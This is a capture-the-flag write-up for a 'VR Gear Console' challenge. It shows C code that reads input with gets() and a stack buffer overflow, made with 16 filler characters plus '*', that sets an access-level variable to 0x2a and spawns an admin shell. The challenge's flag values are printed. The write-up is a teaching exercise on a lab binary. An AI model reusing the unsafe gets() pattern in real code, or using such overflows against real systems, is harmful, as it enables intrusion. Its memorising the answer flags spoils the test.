## VR Gear Console - 95

### Description

Here's the VR gear admin console. See if you can figure out a way to log in. The problem is found here: /problems/1e50bd93be07ea1bca65a1a071e18eef

### Hint

  - What happens if you read in more characters than the length of the username buffer?
  - You should look at an ascii table to see what character you need to choose.
  - Numbers are stored in little-endian format, which means that the lowest byte of the number is first.
  - "cat file - | vrgearconsole " will keep the pipe open for commands.

### Write up

```c
int accessLevel = 0xff;
char username[16];
char password[32];
printf("Username (max 15 characters): ");
gets(username);
printf("Password (max 31 characters): ");
gets(password);
```

The program not limits the length of user input, so we can overflow `username` to change `accessLevel`

```c
else if (access < 0x30) {
        printf("Admin access granted!\n");
        printf("The flag is in \"flag.txt\".\n");
        system("/bin/sh");
```

We want `accessLevel` be less than 0x30. I used *(0x2a) charater.

    $ ./vrgearconsole
    ...
    Username (max 15 characters): aaaaaaaaaaaaaaaa*
    Password (max 31 characters): a
    Your access level is: 0x0000002a
    Admin access granted!
    The flag is in "flag.txt".
    $ cat flag.txt
    5a9aeea545615089851dd6a9b57a3139

> f6f01bf0649b5aa5ec299bb51c8f8db4
